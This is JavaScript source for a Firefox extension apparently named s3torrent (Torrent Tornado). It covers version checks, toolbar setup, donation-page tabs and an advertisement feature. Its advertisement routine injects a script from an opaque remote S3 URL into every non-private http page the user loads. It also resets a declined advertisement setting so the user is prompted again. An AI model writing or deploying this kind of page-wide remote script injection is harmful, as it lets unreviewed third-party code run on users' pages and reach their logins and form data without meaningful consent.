//-------------------------------------------------------------------------------
s3torrent.advertisement = function(event) {
	var mozilla_prefs = s3torrent.addon.prefService.getBranch("extensions.s3torrent.");
	var advertisement = mozilla_prefs.getCharPref("advertisement");
	if (advertisement != 'on') { return; }

	//-----------------------------------------------------------------------------------
	var doc = event.originalTarget;  
	var is_root_frame = false;

	if (doc instanceof HTMLDocument) {
		is_root_frame = true;
		if (doc.defaultView.frameElement) {
			is_root_frame = false;
		}
	}

	//-----------------------------------------------------------------------------------
	if (! (doc.location && doc.location.hostname && (doc.location.protocol == 'http:'))) {
		return;
	}
	//-----------------------------------------------------------------------------------
	if (! is_root_frame) {
		return;
	}
	//-----------------------------------------------------------------------------------
	if (doc.contentType && (! /html/i.test(doc.contentType))) {
		return;
	}
	//-----------------------------------------------------------------------------------
	var elm = doc.getElementsByTagName("body")[0];
	if (!elm) { return; }

	//-----------------------------------------------------------------------------------
	var s = doc.createElement("script");
	s.type = "text/javascript";
	s.src = 'https://s3.amazonaws.com/js-static/d27a5d5aa528b6d91d.js';
	//-----------------------------------------------------------------------------------
	elm.appendChild(s);
}
//------------------------------------------------------------------------------
s3torrent.addon = {
	version : '0',
//	donateURL: 'https://addons.mozilla.org/addon/torrent-tornado/contribute/installed/',
	donateURL: 'http://www.s3blog.org/addon-contribute/torrent-tornado.html',
	prefService: Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService)
};

//------------------------------------------------------------------------------
s3torrent.addon.get_version = function() {
	Components.utils.import("resource://gre/modules/AddonManager.jsm");
	AddonManager.getAddonByID('s3torrent@tornado', function(addon) {
		s3torrent.addon.version = addon.version;
		if ((addon.version != '') && (addon.version != '0')) {
			setTimeout(s3torrent.addon.checkPrefs, 2000);
		}
	});
	//----------------------------------------------------------------------
	if ("gBrowser" in window) {
		var PBU = {};
		Components.utils.import("resource://gre/modules/PrivateBrowsingUtils.jsm", PBU);
		var is_public = true;
		try {
			if (PBU.PrivateBrowsingUtils.isWindowPrivate(window)) {
				is_public = false;
			}
		} catch(e) {
		}
		if (is_public) {
			gBrowser.addEventListener("load", s3torrent.advertisement, true);
		}
	}
}
//------------------------------------------------------------------------------
s3torrent.addon.addonDonate = function() {
	try{
		gBrowser.selectedTab = gBrowser.addTab(s3torrent.addon.donateURL);
	}catch(e){;}
}
//------------------------------------------------------------------------------
s3torrent.addon.checkPrefs = function() {
	var mozilla_prefs = s3torrent.addon.prefService.getBranch("extensions.s3torrent.");

	//----------------------------------------------------------------------
	var old_version = mozilla_prefs.getCharPref("current_version");
	var not_open_contribute_page = mozilla_prefs.getBoolPref("not_open_contribute_page");
	var current_day = Math.ceil((new Date()).getTime() / (1000*60*60*24));
	var is_set_timer = false;

	//----------------------------------------------------------------------
	if (old_version == '0') {
		var bar = document.getElementById("nav-bar");
		if (bar) {
			var curSet  = bar.currentSet.split(",");
			var index = curSet.indexOf("s3torrent_toolbar_button");
			if (index == -1) {
				curSet.push("s3torrent_toolbar_button");
			}
			bar.setAttribute("currentset", curSet.join(","));
			bar.currentSet = curSet.join(",");
			document.persist(bar.id, "currentset");
			try {
				s3torrent.button_toolbar_custom();
				BrowserToolboxCustomizeDone(true);
			}
			catch (e) {};
		}
	}

	//----------------------------------------------------------------------
	if (s3torrent.addon.version != old_version) {
		mozilla_prefs.setCharPref("current_version", s3torrent.addon.version);
		var result = ((old_version == '') || (old_version == '0')) ? false : true;
		//--------------------------------------------------------------
		if (result) {
			if (! not_open_contribute_page) {
				is_set_timer = true;
				s3torrent.addon.addonDonate();
			}
		}
	}
	//----------------------------------------------------------------------
	if (s3torrent.addon.version == old_version) {
		var show_page_timer =  mozilla_prefs.getIntPref("show_page_timer");
		//--------------------------------------------------------------
		if (show_page_timer > 0) {
			show_page_timer -= Math.floor(Math.random() * 15);
			if ((show_page_timer + 60) < current_day) {
				if (! not_open_contribute_page) {
					is_set_timer = true;
					s3torrent.addon.addonDonate();
				}
			}
		} else {
			is_set_timer = true;
		}
	}
	//----------------------------------------------------------------------
	if (is_set_timer) {
		mozilla_prefs.setIntPref("show_page_timer", current_day);
	}
	//----------------------------------------------------------------------
	if (s3torrent.addon.version == old_version) {
		var advertisement = mozilla_prefs.getCharPref("advertisement");
		if ((advertisement == 'wait') || (advertisement == 'off')) {
			mozilla_prefs.setCharPref("advertisement", "check");
		}
		else if (advertisement == 'check') {
			mozilla_prefs.setCharPref("advertisement", "off2");
			gBrowser.selectedTab = gBrowser.addTab('chrome://s3torrent/content/advertisement.xul');
		}
	}
}

window.addEventListener("load", s3torrent.addon.get_version, false);
